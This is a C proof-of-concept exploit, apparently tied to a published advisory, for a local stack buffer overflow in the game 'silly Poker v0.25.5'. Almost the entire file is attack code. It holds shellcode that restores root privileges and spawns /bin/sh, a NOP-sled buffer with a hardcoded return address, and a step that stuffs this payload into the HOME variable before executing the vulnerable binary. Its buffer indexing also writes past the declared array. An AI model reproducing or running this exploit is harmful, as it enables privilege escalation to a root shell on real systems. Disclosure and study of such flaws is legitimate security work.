/* c-sillyPoker.c
 *
 * PoC exploit made for advisory based uppon an local stack based overflow.
 * Vulnerable versions, maybe also prior versions:
 *
 * silly Poker v0.25.5
 *
 * Tested on:  Debian 3.1
 *
 * Advisory source: c-code.net (security research team)
 * http://www.c-code.net/Releases/Advisories/c-code-adv002.txt
 *
 * ---------------------------------------------
 * coded by: demz (c-code.net) (demz@c-code.net)
 * ---------------------------------------------
 *
 */

#include <stdio.h>
#include <stdlib.h>

char shellcode[]=

	"\x31\xc0"                      // xor          eax, eax
        "\x31\xdb"                      // xor          ebx, ebx
        "\x31\xc9"                      // xor          ecx, ecx
        "\xb0\x46"                      // mov          al, 70
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\x50"                          // push         eax
        "\x68\x6e\x2f\x73\x68"          // push  long   0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // push  long   0x69622f2f
        "\x89\xe3"                      // mov          ebx, esp
        "\x50"                          // push         eax
        "\x53"                          // push         ebx
        "\x89\xe1"                      // mov          ecx, esp
        "\x99"                          // cdq
        "\xb0\x0b"                      // mov          al, 11
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\xb0\x01"                      // mov          al, 1
        "\xcd\x80";                     // int          0x80

int main()
{
	unsigned long ret = 0xbffffb44;

	char buffer[1028];
	int i=0;

	memset(buffer, 0x90, sizeof(buffer));

	for (0; i < strlen(shellcode) - 1;i++)
	buffer[500 + i] = shellcode[i];

	buffer[1028] = (ret & 0x000000ff);
	buffer[1029] = (ret & 0x0000ff00) >> 8;
	buffer[1030] = (ret & 0x00ff0000) >> 16;
	buffer[1031] = (ret & 0xff000000) >> 24;
	buffer[1032] = 0x0;

	printf("\nsilly Poker v0.25.5 local exploit\n");
        printf("---------------------------------------- demz @ c-code.net --\n");

	setenv("HOME", buffer, 1);

	execl("/usr/bin/sillypoker", "sillypoker", NULL);
}